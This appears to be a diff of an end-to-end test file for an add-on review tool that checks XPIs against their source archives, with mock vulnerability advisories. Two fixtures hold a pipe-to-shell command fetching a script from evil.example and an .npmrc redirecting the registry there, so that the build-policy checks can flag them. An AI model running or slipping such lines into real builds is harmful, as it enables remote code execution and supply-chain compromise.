@@ -15,13 +15,24 @@ import path from "node:path";
 import { runPipeline } from "../../src/pipeline.js";
 import { formatText } from "../../src/report/format.js";
 import { loadRegistry } from "../../src/checks/registry.js";
-import { fixtureCacheOpts } from "../seed-caches.js";
-import { reviewFilePaths } from "../../src/report/items.js";
-import { pathStamp, submissionLeaf } from "../../src/util/dest.js";
+import { fixtureCacheOpts, freshWorkFolder } from "../seed-caches.js";
+import { defaultWorkFolder } from "../../src/util/dest.js";
+import {
+  PREPARE_STEP,
+  startRecord,
+  writePrepare,
+} from "../../src/prepare/state.js";
+import { HandbackRefused } from "../../src/report/handback.js";
 
 // A cache pre-seeded from the fixtures so the schema / experiments / library-hash
 // fetches all hit disk - these runs stay offline.
 const OFFLINE = fixtureCacheOpts();
+
+/** runPipeline in a fresh work folder of its own, as every review gets one - unless the
+ *  test names the folder itself. */
+function runReview(opts) {
+  return runPipeline({ workFolder: freshWorkFolder(), ...opts });
+}
 
 function tmpDir(files) {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-sca-"));
@@ -103,7 +114,7 @@ test("SCA e2e: a flat layout is accepted and fully reviewed", async () => {
   const src = tmpDir(FLAT_SRC);
   try {
     {
-      const { findings, meta } = await runPipeline({
+      const { findings, meta } = await runReview({
         addonPath: xpi,
         scaRoot: src,
         ...OFFLINE,
@@ -146,7 +157,7 @@ test("SCA e2e: the rendered report carries [XPI]/[SCA] labels + the footer", asy
     "app.js": `browser.totallyFakeNamespace.doThing();\n`, // a source (SCA) finding
   });
   try {
-    const result = await runPipeline({
+    const result = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -202,8 +213,8 @@ test("SCA e2e: the built XPI's input:xpi findings match a standalone XPI review 
   });
   const src = tmpDir(SRC_FILES);
   try {
-    const sca = await runPipeline({ addonPath: xpi, scaRoot: src, ...OFFLINE });
-    const xpiOnly = await runPipeline({ addonPath: xpi, ...OFFLINE });
+    const sca = await runReview({ addonPath: xpi, scaRoot: src, ...OFFLINE });
+    const xpiOnly = await runReview({ addonPath: xpi, ...OFFLINE });
     assert.equal(
       sca.mode,
       REVIEW_MODE.SCA,
@@ -243,7 +254,7 @@ test("SCA e2e: --sca-root alone switches to SCA mode and is the review source", 
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir(FLAT_SRC);
   try {
-    const { findings, meta } = await runPipeline({
+    const { findings, meta } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -268,10 +279,61 @@ test("SCA e2e: --sca-root alone switches to SCA mode and is the review source", 
   }
 });
 
-// The dependency audit reads the root package.json, which in a flat layout IS the review
-// addon's own package.json - so resolveVendor + the vendor checks run exactly as in a
-// nested layout. A vulnerable devDependency is surfaced by vendor-vulnerable-dev.
-test("SCA e2e: a flat layout audits the root package.json dependencies", async () => {
+// A committed npm lock declaring one build dependency, `build-tool`, installed for the build
+// only - what a source review reads its dependencies from.
+const BUILD_TOOL_LOCK = JSON.stringify({
+  name: "sca-e2e",
+  version: "1.0.0",
+  lockfileVersion: 3,
+  requires: true,
+  packages: {
+    "": {
+      name: "sca-e2e",
+      version: "1.0.0",
+      devDependencies: { "build-tool": "1.0.0" },
+    },
+    "node_modules/build-tool": { version: "1.0.0", dev: true },
+  },
+});
+
+/**
+ * An OSV transport answering the lock audit's batch with one HIGH advisory for
+ * `build-tool`, fixed in 2.0.0, and that advisory's record when it is hydrated.
+ * @param {string} id  The advisory id.
+ * @returns {object}
+ */
+function buildToolAdvisoryNet(id) {
+  const advisory = {
+    id,
+    aliases: ["CVE-2021-0001"],
+    database_specific: { severity: "HIGH" },
+    affected: [
+      {
+        package: { ecosystem: "npm", name: "build-tool" },
+        ranges: [
+          {
+            type: "SEMVER",
+            events: [{ introduced: "0" }, { fixed: "2.0.0" }],
+          },
+        ],
+      },
+    ],
+  };
+  return {
+    fetchBytes: async () => Buffer.from(""),
+    fetchJson: async (url) => (url.endsWith(`/${id}`) ? advisory : {}),
+    postJson: async (_url, body) => ({
+      results: (body?.queries ?? []).map((q) =>
+        q.package.name === "build-tool" ? { vulns: [{ id }] } : { vulns: [] }
+      ),
+    }),
+  };
+}
+
+// The dependency audit reads the root lock file, which in a flat layout IS the review
+// addon's own - so resolveVendor + the vendor checks run exactly as in a nested layout. A
+// vulnerable build dependency is surfaced by vendor-vulnerable-dev.
+test("SCA e2e: a flat layout audits the root lock file's dependencies", async () => {
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir({
     ...FLAT_SRC,
@@ -280,36 +342,11 @@ test("SCA e2e: a flat layout audits the root package.json dependencies", async (
       version: "1.0.0",
       devDependencies: { "build-tool": "1.0.0" },
     }),
+    "package-lock.json": BUILD_TOOL_LOCK,
   });
-  const vendorNet = {
-    fetchBytes: async () => Buffer.from(""),
-    fetchJson: async () => ({}),
-    postJson: async (_url, body) =>
-      body?.package?.name === "build-tool"
-        ? {
-            vulns: [
-              {
-                id: "GHSA-flat-0000-0000",
-                aliases: ["CVE-2021-9999"],
-                database_specific: { severity: "HIGH" },
-                affected: [
-                  {
-                    package: { ecosystem: "npm", name: "build-tool" },
-                    ranges: [
-                      {
-                        type: "SEMVER",
-                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
-                      },
-                    ],
-                  },
-                ],
-              },
-            ],
-          }
-        : { vulns: [] },
-  };
+  const vendorNet = buildToolAdvisoryNet("GHSA-flat-0000-0000");
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -317,7 +354,7 @@ test("SCA e2e: a flat layout audits the root package.json dependencies", async (
     });
     assert.ok(
       has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
-      "the root package.json's dependencies are audited in a flat layout"
+      "the root lock file's dependencies are audited in a flat layout"
     );
   } finally {
     [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
@@ -393,7 +430,7 @@ test("SCA e2e: an undeclared source-bundled library is CDN-identified and OSV-au
   };
   const cdnCache = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-cdn-"));
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -434,7 +471,7 @@ test("SCA: the --sca-root archive is read once, not twice", async () => {
     return realReaddir(p, ...rest);
   });
   try {
-    await runPipeline({
+    await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -472,7 +509,7 @@ test("SCA meta names the artifacts, each a real path", async () => {
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir(SRC_FILES);
   try {
-    const { meta } = await runPipeline({
+    const { meta } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -488,7 +525,7 @@ test("SCA meta names the artifacts, each a real path", async () => {
     // value nobody supplied says something false. It is also the only place a reader learns
     // that a subtree was excluded from the WebExtension checks, and which one.
     assert.equal(meta.scaExpSource, undefined);
-    const { meta: withExp } = await runPipeline({
+    const { meta: withExp } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       scaExpSource: path.join(src, "src", "experiments"),
@@ -507,41 +544,39 @@ test("SCA meta names the artifacts, each a real path", async () => {
 });
 
 // The two files a --llm-review run NAMES and never writes: the add-on description, and -
-// only in a source code review - what building the add-on takes. Both sit beside the
-// submitted add-on, never inside it, so the links the reviewer is handed open where they
-// are working. The build one is gated on the review being a source code one, not on
+// only in a source code review - what building the add-on takes. Both sit in the review's
+// work folder under their bare names, beside the review's own files, and never inside the
+// submitted add-on. The build one is gated on the review being a source code one, not on
 // --llm-skip-summary, which withholds the description alone.
-test("an SCA --llm-review names a build report beside the add-on", async () => {
+test("an SCA --llm-review names a build report in the work folder", async () => {
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir(SRC_FILES);
+  const work = freshWorkFolder();
   try {
-    const { meta } = await runPipeline({
+    const { meta } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       llmReview: true,
+      workFolder: work,
       ...OFFLINE,
     });
-    assert.match(meta.buildFile, /\.build\.md$/);
-    assert.equal(path.dirname(meta.buildFile), path.dirname(xpi));
-    assert.equal(meta.buildFile.startsWith(`${xpi}${path.sep}`), false);
-    // One name and one moment for all of them, so none can drift from this review.
-    const base = path.basename(meta.reviewFile, ".review.json");
-    assert.equal(path.basename(meta.buildFile), `${base}.build.md`);
-    assert.equal(path.basename(meta.summaryFile), `${base}.summary.md`);
-    assert.equal(path.basename(meta.reportFile), `${base}.report.md`);
+    assert.equal(meta.buildFile, path.join(work, "build.md"));
+    assert.equal(meta.summaryFile, path.join(work, "summary.md"));
+    assert.equal(meta.reportFile, path.join(work, "report.md"));
+    assert.equal(meta.xpiRoot, `${path.join(work, "xpi")}${path.sep}`);
     // Named, never written: this tool only says where these two go.
     assert.equal(fs.existsSync(meta.buildFile), false);
     assert.equal(fs.existsSync(meta.summaryFile), false);
 
     // An XPI review has no build to reproduce, so it names none - but every review has a
     // report, and that one this tool writes itself, so it is named either way.
-    const xpiOnly = await runPipeline({
+    const xpiOnly = await runReview({
       addonPath: xpi,
       llmReview: true,
       ...OFFLINE,
     });
     assert.equal(xpiOnly.meta.buildFile, undefined);
-    assert.match(xpiOnly.meta.reportFile, /\.report\.md$/);
+    assert.equal(path.basename(xpiOnly.meta.reportFile), "report.md");
   } finally {
     fs.rmSync(xpi, { recursive: true, force: true });
     fs.rmSync(src, { recursive: true, force: true });
@@ -552,7 +587,7 @@ test("SCA e2e: code checks review the source; manifest/WAR resolve against the X
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir(SRC_FILES);
   try {
-    const result = await runPipeline({
+    const result = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -608,7 +643,7 @@ test("SCA e2e: --sca-exp-source excludes the Experiment subtree from the code ch
     };
     // Without the flag, the privileged Experiment code is reviewed as WebExtension
     // code and false-positives core-symbol-in-webext.
-    const without = await runPipeline(base);
+    const without = await runReview(base);
     assert.ok(
       has(
         without.findings,
@@ -621,7 +656,7 @@ test("SCA e2e: --sca-exp-source excludes the Experiment subtree from the code ch
     // With the flag - an absolute path inside --sca-root - the
     // experiment subtree is excluded, no false positive, while the real defect in main.js
     // is still caught.
-    const withExp = await runPipeline({
+    const withExp = await runReview({
       ...base,
       scaExpSource: path.join(src, "src", "experiments"),
     });
@@ -643,7 +678,7 @@ test("SCA e2e: --sca-exp-source excludes the Experiment subtree from the code ch
     // reaching the pipeline is absolute (src/cli.js resolves them) - so this is a question
     // about where it lands.
     await assert.rejects(
-      runPipeline({ ...base, scaExpSource: path.join(xpi, "experiments") }),
+      runReview({ ...base, scaExpSource: path.join(xpi, "experiments") }),
       /is not inside --sca-root/
     );
   } finally {
@@ -675,8 +710,8 @@ test("SCA e2e: an Experiment add-on needs --sca-exp-source", async () => {
       allowExperiments: true,
       ...OFFLINE,
     };
-    await assert.rejects(runPipeline(base), /--sca-exp-source/);
-    const review = await runPipeline({
+    await assert.rejects(runReview(base), /--sca-exp-source/);
+    const review = await runReview({
       ...base,
       scaExpSource: path.join(src, "src", "experiments"),
     });
@@ -703,7 +738,7 @@ test("SCA e2e: --sca-exp-source may sit beside the add-on code under --sca-root"
     };
     // Accepted (no throw) when the sibling folder sits anywhere under --sca-root.
     for (const scaExpSource of [path.join(src, "experiment")]) {
-      const res = await runPipeline({ ...base, scaExpSource });
+      const res = await runReview({ ...base, scaExpSource });
       // The review source is still reviewed...
       assert.ok(
         hasItem(res.meta, "unknown-api", (m) => m.file === "src/main.js"),
@@ -734,7 +769,7 @@ test("SCA e2e: unused-files flags the build's dead files, not source scaffolding
     "src/leftover-config.js": `console.log("unreferenced source scaffolding");`,
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -771,7 +806,7 @@ test("SCA e2e: locale checks evaluate _locales against the XPI, not the source",
   });
   const src = tmpDir(SRC_FILES); // no _locales in the source
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -807,7 +842,7 @@ test("SCA e2e: missing-english-localization checks the XPI's _locales, not sourc
     "src/popup.html": `<html><body><h1>Willkommen bei unserer Erweiterung</h1><p>Diese Anwendung verwaltet Ihre Nachrichten und Einstellungen sorgfaeltig und zuverlaessig.</p></body></html>`,
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -848,7 +883,7 @@ test("SCA e2e: background-module judges the XPI's background script, not the ESM
     "util.js": `export const x = 1;`,
   });
   try {
-    const a = await runPipeline({
+    const a = await runReview({
       addonPath: xpiClassic,
       scaRoot: srcEsm,
       ...OFFLINE,
@@ -857,7 +892,7 @@ test("SCA e2e: background-module judges the XPI's background script, not the ESM
       !has(a.findings, "background-module"),
       "an ESM source bundled to a classic shipped script must not false-positive"
     );
-    const b = await runPipeline({
+    const b = await runReview({
       addonPath: xpiEsm,
       scaRoot: srcEsm,
       ...OFFLINE,
@@ -890,7 +925,7 @@ test("SCA e2e: trademark-violation resolves a localized name via the XPI's _loca
   });
   const src = tmpDir(SRC_FILES); // no _locales in the source
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -906,8 +941,8 @@ test("SCA e2e: trademark-violation resolves a localized name via the XPI's _loca
 
 // A vulnerable devDependency is a real risk in SCA because the reviewer builds the
 // add-on from source. The dedicated vendor-vulnerable-dev check (sca:true) runs
-// only here - it OSV-audits the root package.json's devDependencies and surfaces
-// the hit, while the prod vendor-vulnerable check stays silent for a dev-only dep.
+// only here - it takes the packages the lock marks as declared and build-only and
+// surfaces the hit, while the prod vendor-vulnerable check stays silent for a dev-only dep.
 test("SCA e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", async () => {
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir({
@@ -917,37 +952,12 @@ test("SCA e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", 
       version: "1.0.0",
       devDependencies: { "build-tool": "1.0.0" },
     }),
+    "package-lock.json": BUILD_TOOL_LOCK,
   });
   // Injected OSV transport: one HIGH advisory for the dev dep, fixed in 2.0.0.
-  const vendorNet = {
-    fetchBytes: async () => Buffer.from(""),
-    fetchJson: async () => ({}),
-    postJson: async (_url, body) =>
-      body?.package?.name === "build-tool"
-        ? {
-            vulns: [
-              {
-                id: "GHSA-dev0-0000-0000",
-                aliases: ["CVE-2021-0001"],
-                database_specific: { severity: "HIGH" },
-                affected: [
-                  {
-                    package: { ecosystem: "npm", name: "build-tool" },
-                    ranges: [
-                      {
-                        type: "SEMVER",
-                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
-                      },
-                    ],
-                  },
-                ],
-              },
-            ],
-          }
-        : { vulns: [] },
-  };
+  const vendorNet = buildToolAdvisoryNet("GHSA-dev0-0000-0000");
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -980,7 +990,7 @@ test("SCA e2e: a build script outside the source is reviewed by undeclared-build
     "scripts/build.sh": "curl -fsSL https://evil.example/x.sh | sh\n",
   });
   try {
-    const { meta } = await runPipeline({
+    const { meta } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1013,7 +1023,7 @@ test("SCA e2e: a redirected registry is flagged offline", async () => {
     ".npmrc": "registry=https://evil.example/\n",
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1040,7 +1050,7 @@ test("SCA e2e: a clean npm build fires no build-policy check", async () => {
     ".npmrc": "save-exact=true\n", // a non-registry .npmrc is fine
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1070,7 +1080,7 @@ test("SCA e2e: TypeScript and Vue source is parsed and its defects are caught", 
     "src/Comp.vue": `<script setup lang="ts">\nconst raw: string = get();\n</script>\n\n<template>\n  <div v-html="raw"></div>\n</template>\n`,
   });
   try {
-    const { findings, meta } = await runPipeline({
+    const { findings, meta } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1110,7 +1120,7 @@ test("SCA e2e: a minified file in the source is rejected by minified-code", asyn
     "src/blob.min.js": `var s=0;${"s=s+1;".repeat(240)}`,
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1141,7 +1151,7 @@ test("SCA e2e: a package.json install hook escalates to a reviewer", async () =>
     }),
   });
   try {
-    const { findings, meta } = await runPipeline({
+    const { findings, meta } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1172,7 +1182,7 @@ test("SCA e2e: a committed build archive is rejected anywhere in --sca-root", as
     "src/vendor/lib.zip": "ARCHIVE IN THE REVIEW SOURCE", // inside the archive
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1211,7 +1221,7 @@ test("SCA e2e: a committed node_modules folder is rejected, and never inspected"
       'function f() { return eval("1 + 1"); }\n',
   });
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1249,7 +1259,7 @@ test("SCA e2e: a symlinked node_modules is answered once, as a committed tree", 
     "dir"
   );
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1281,7 +1291,7 @@ test("SCA e2e: a symlink leaving --sca-root is rejected, one staying inside is n
   );
   fs.symlinkSync("src/inner", path.join(src, "intree"), "dir");
   try {
-    const { findings } = await runPipeline({
+    const { findings } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1316,7 +1326,7 @@ test("SCA e2e: a link inside the add-on refuses the XPI", async () => {
   fs.symlinkSync("src", path.join(src, "intree"), "dir");
   try {
     await assert.rejects(
-      runPipeline({ addonPath: xpi, scaRoot: src, ...OFFLINE }),
+      runReview({ addonPath: xpi, scaRoot: src, ...OFFLINE }),
       {
         message:
           "Invalid XPI: alias.js is a symbolic link (an add-on must contain regular files only).",
@@ -1374,7 +1384,7 @@ test("SCA e2e: the two submission-shape checks fire independently", async () => 
     "package.json": JSON.stringify({ name: "shipped", version: "1.0.0" }),
   });
   try {
-    const a = await runPipeline({
+    const a = await runReview({
       addonPath: xpi,
       scaRoot: twinned,
       ...OFFLINE,
@@ -1389,14 +1399,14 @@ test("SCA e2e: the two submission-shape checks fire independently", async () => 
       "the declarations are in the ARCHIVE, which is where they belong"
     );
 
-    const b = await runPipeline({ addonPath: xpi, scaRoot: built, ...OFFLINE });
+    const b = await runReview({ addonPath: xpi, scaRoot: built, ...OFFLINE });
     assert.equal(b.mode, REVIEW_MODE.SCA, "still a source review, as always");
     assert.ok(
       !has(b.findings, "sca-xpi-fully-included-in-archive"),
       "a shipped file that was built has no twin, and the archive is needed"
     );
 
-    const c = await runPipeline({
+    const c = await runReview({
       addonPath: xpiWithDeclaration,
       scaRoot: built,
       ...OFFLINE,
@@ -1438,7 +1448,7 @@ test("SCA e2e: an archive holding the whole XPI is reported, and is still review
     "only-in-source.js": `browser.totallyFakeNamespace.doThing();\n`,
   });
   try {
-    const result = await runPipeline({
+    const result = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1494,7 +1504,7 @@ test("SCA e2e: a minified-XPI submission stays in SCA mode (a legitimate SCA)", 
   const xpi = tmpDir(XPI_FILES); // background.js ships minified -> the XPI is not reviewable as-is
   const src = tmpDir(SRC_FILES);
   try {
-    const { findings, mode } = await runPipeline({
+    const { findings, mode } = await runReview({
       addonPath: xpi,
       scaRoot: src,
       ...OFFLINE,
@@ -1513,11 +1523,9 @@ test("SCA e2e: a minified-XPI submission stays in SCA mode (a legitimate SCA)", 
   }
 });
 
-// The review's three reviewer-facing files land BESIDE the submission, and this run writes
-// none of them - the description and build report are the agents', the report a later
-// pass's. So the folder is refused before the review is built, or the failure lands after
-// it is finished. What was there before probed the temp directory instead: the one place
-// that cannot fail, and not where any of the three goes.
+// Every file a review creates lives in its work folder, so a folder that cannot take them
+// is refused before the review is built - for a plain review too, which writes its copy of
+// the add-on there - rather than failing once the review is over.
 //
 // `access(W_OK)` is bypassed for root, so as root these assert nothing rather than
 // something wrong.
@@ -1538,35 +1546,47 @@ function nestedAddon() {
 }
 
 test(
-  "a review that names files beside the submission refuses an unwritable folder",
+  "a review refuses a work folder it cannot write to",
   {
     skip: asRoot ? "access(W_OK) is bypassed for root" : false,
   },
   async () => {
-    const { parent, addon } = nestedAddon();
+    const xpi = tmpDir(XPI_FILES);
+    // The folder is there, as a prepared one is when its hand-back starts the review.
+    const work = freshWorkFolder();
+    fs.mkdirSync(work);
     try {
-      fs.chmodSync(parent, 0o500);
-      await assert.rejects(
-        () => runPipeline({ addonPath: addon, llmReview: true, ...OFFLINE }),
-        (err) => {
-          assert.match(err.message, /cannot write there/);
-          assert.ok(err.message.includes(parent), "names the folder");
-          return true;
-        }
-      );
+      fs.chmodSync(work, 0o500);
+      for (const llmReview of [false, true]) {
+        await assert.rejects(
+          () =>
+            runReview({
+              addonPath: xpi,
+              workFolder: work,
+              llmReview,
+              ...OFFLINE,
+            }),
+          (err) => {
+            assert.match(err.message, /cannot be written to/);
+            assert.ok(err.message.includes(work), "names the folder");
+            return true;
+          }
+        );
+      }
+      assert.deepEqual(fs.readdirSync(work), []);
     } finally {
       // Before the cleanup, or it cannot remove what it made.
-      fs.chmodSync(parent, 0o700);
-      fs.rmSync(parent, { recursive: true, force: true });
+      fs.chmodSync(work, 0o700);
+      fs.rmSync(xpi, { recursive: true, force: true });
     }
   }
 );
 
-// The other half, and the one that says the check did not over-reach: an ordinary review
-// prints its report and writes nothing beside the submission, so an unwritable folder is
-// none of its business.
+// The other half, and the one that says the check did not over-reach: the submission's own
+// folder is read and never written, so a review whose work folder is elsewhere runs though
+// the folder holding the add-on is read-only.
 test(
-  "an ordinary review still runs in a folder it cannot write to",
+  "a review runs beside a submission in a folder it cannot write to",
   {
     skip: asRoot ? "access(W_OK) is bypassed for root" : false,
   },
@@ -1574,13 +1594,14 @@ test(
     const { parent, addon } = nestedAddon();
     try {
       fs.chmodSync(parent, 0o500);
-      const { meta, findings } = await runPipeline({
+      const { meta, findings } = await runReview({
         addonPath: addon,
+        llmReview: true,
         ...OFFLINE,
       });
-      assert.equal(meta.prompting, undefined);
-      assert.equal(meta.reportFile, undefined); // nothing named, so nothing to write
+      assert.equal(meta.prompting, true);
       assert.ok(Array.isArray(findings), "the review completed");
+      assert.deepEqual(fs.readdirSync(parent), ["addon"]);
     } finally {
       fs.chmodSync(parent, 0o700);
       fs.rmSync(parent, { recursive: true, force: true });
@@ -1588,48 +1609,9 @@ test(
   }
 );
 
-// The five files a review names share one stem, and it is read off the PATH the run was
-// given - never off the manifest. The manifest's name is submission data of any shape, and
-// the one thing the stem is for is being recognised by whoever opens the file, which the
-// name of the thing they downloaded does anyway.
-test("the review's files are named after the submission, whatever it was given", () => {
-  const stem = (p) => path.basename(reviewFilePaths(p).report, ".report.md");
-  // A packed submission, and the folder an earlier run unpacked it into - both spellings,
-  // because a reviewer re-reviewing points the linter at one of those and still expects to
-  // recognise the name. The unpacked-from-the-start case has no suffix to lose.
-  const shapes = [
-    "/dl/foo.xpi",
-    "/dl/foo",
-    `/dl/foo.xpi.extracted`,
-    `/dl/foo.xpi.extracted-${pathStamp()}`,
-  ];
-  for (const p of shapes) {
-    assert.match(stem(p), /^foo-\d{4}-\d{2}-\d{2}T[\d-]+Z$/, p);
-  }
-  // A stamp is matched by its shape, so a folder somebody named that way keeps its name.
-  assert.equal(
-    submissionLeaf("/dl/foo.xpi.extracted-notes"),
-    "foo.xpi.extracted-notes"
-  );
-  // Escaped, not because a leaf could escape a directory - it cannot - but because an
-  // ordinary name like this one would otherwise upset a shell.
-  assert.match(stem("/dl/My Add-on 1.0.xpi"), /^My_Add-on_1\.0-/);
-  // One stem for all five, which is what a later pass checks rather than trusts.
-  const files = reviewFilePaths("/dl/foo.xpi");
-  const base = path.basename(files.review, ".review.json");
-  for (const [key, suffix] of [
-    ["summary", ".summary.md"],
-    ["build", ".build.md"],
-    ["report", ".report.md"],
-  ]) {
-    assert.equal(path.basename(files[key]), `${base}${suffix}`, key);
-  }
-});
-
-// The regression this replaced a crash with. The stem used to come from the manifest, so a
-// `name` of the wrong type threw while the files were being named - after the review had
-// finished, and after mistyped-manifest-value had already found the bad value. The review
-// and the finding that explains it were both discarded.
+// A manifest.json `name` of the wrong type is a finding, and naming the review's files must
+// not depend on it: the default work folder is named off the add-on's PATH, so neither
+// value is ever read for it, and the review and the finding that explains it both survive.
 test("a manifest whose name and version are not strings still reviews", async () => {
   const parent = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-badname-"));
   const addon = path.join(parent, "brokenname");
@@ -1645,20 +1627,140 @@ test("a manifest whose name and version are not strings still reviews", async ()
   );
   fs.writeFileSync(path.join(addon, "bg.js"), "1;\n");
   try {
-    const { meta, findings } = await runPipeline({
+    const { meta, findings } = await runReview({
       addonPath: addon,
       llmReview: true,
+      workFolder: defaultWorkFolder(addon),
       ...OFFLINE,
     });
     // Named from the folder, so neither value was ever read for it.
-    assert.match(path.basename(meta.reportFile), /^brokenname-/);
-    // And the findings survive - which is the whole point: they existed before too, and
-    // were thrown away with the crash.
+    assert.match(path.basename(path.dirname(meta.reportFile)), /^brokenname-/);
+    // And the findings survive.
     assert.ok(
       findings.some((f) => f.ruleId === "mistyped-manifest-value"),
       "the bad values are reported to the developer"
     );
   } finally {
     fs.rmSync(parent, { recursive: true, force: true });
+  }
+});
+
+// ---- a source review its preparation could not rescue ----
+// The work folder's record is done and unrescued, and holds the lock audit the preparation
+// ran. The review is decided by it: no network is asked for the dependencies, only the checks
+// the registry's rescue-for reasons name run, and they abort it. The record is a file the agent
+// can write, so one that would let such a review pass is refused before anything is claimed.
+
+const UNRESCUED_FIXTURE = path.join(
+  path.dirname(new URL(import.meta.url).pathname),
+  "..",
+  "addons",
+  "sca-unrescued"
+);
+
+/** The lock audit a preparation records: one critical entry on a declared build tool. */
+const recordedAudit = (over = {}) => ({
+  vulnerabilities: [],
+  devVulnerabilities: [
+    {
+      name: "lint-pebble",
+      version: "0.4.0",
+      ids: ["GHSA-fixture-pebble"],
+      severity: "critical",
+      fixed: ["0.4.1"],
+      file: "package-lock.json",
+      token: "node_modules/lint-pebble",
+      ...over,
+    },
+  ],
+  treeVulnerabilities: [],
+  treeDevVulnerabilities: [],
+});
+
+/** A work folder whose preparation gave its rescue up, recording `lockAudit`. */
+function unrescuedFolder(lockAudit) {
+  const work = freshWorkFolder();
+  writePrepare(work, {
+    ...startRecord({ submission: { xpi: "", experiments: false }, flags: {} }),
+    step: PREPARE_STEP.done,
+    unrescued: true,
+    lockAudit,
+  });
+  return work;
+}
+
+/** A network that fails the test on any request. */
+const noNet = {
+  fetchBytes: async () => assert.fail("no request expected"),
+  fetchJson: async () => assert.fail("no request expected"),
+  postJson: async () => assert.fail("no request expected"),
+};
+
+test("an unrescued review is decided by the recorded lock audit, asking no network", async () => {
+  const { findings, meta } = await runReview({
+    addonPath: path.join(UNRESCUED_FIXTURE, "xpi"),
+    scaRoot: path.join(UNRESCUED_FIXTURE, "src"),
+    workFolder: unrescuedFolder(recordedAudit()),
+    vendorNet: noNet,
+    ...OFFLINE,
+    cdnLookup: true,
+  });
+  const registry = loadRegistry();
+  const { rescueFor } = registry.llmScaReviewPrompt();
+  assert.deepEqual(
+    meta.checksRun,
+    registry
+      .checkIds()
+      .filter((id) => rescueFor.includes(registry.earlyExitFor(id)))
+  );
+  assert.deepEqual(
+    findings.map((f) => [f.ruleId, f.file, f.loc?.line]),
+    [["vendor-vulnerable-dev", "package-lock.json", 13]]
+  );
+  assert.deepEqual(
+    meta.earlyExit.reasons.map((r) => r.id),
+    ["known-vulnerabilities"]
+  );
+  assert.deepEqual(meta.manualReview, []);
+  assert.equal(meta.preSweep, null);
+});
+
+test("an unrescued record that would let its review pass is refused", async (t) => {
+  const forged = {
+    "no lock audit": null,
+    "empty lists": {
+      vulnerabilities: [],
+      devVulnerabilities: [],
+      treeVulnerabilities: [],
+      treeDevVulnerabilities: [],
+    },
+    "a moderate advisory only": recordedAudit({ severity: "moderate" }),
+    "an entry outside a lock": recordedAudit({ file: "src/bg.js" }),
+    "an entry with no ids": recordedAudit({ ids: "GHSA-x" }),
+    "a list missing": { vulnerabilities: [], devVulnerabilities: [] },
+  };
+  for (const [name, lockAudit] of Object.entries(forged)) {
+    await t.test(name, async () => {
+      const work = unrescuedFolder(lockAudit);
+      await assert.rejects(
+        runReview({
+          addonPath: path.join(UNRESCUED_FIXTURE, "xpi"),
+          scaRoot: path.join(UNRESCUED_FIXTURE, "src"),
+          workFolder: work,
+          vendorNet: noNet,
+          ...OFFLINE,
+        }),
+        (err) => {
+          assert.ok(err instanceof HandbackRefused, err.message);
+          assert.match(
+            err.problem,
+            /holds no lock audit with a high or critical/
+          );
+          return true;
+        }
+      );
+      // Refused before anything was claimed: the folder holds the record alone.
+      assert.deepEqual(fs.readdirSync(work), ["prepare.json"]);
+    });
   }
 });
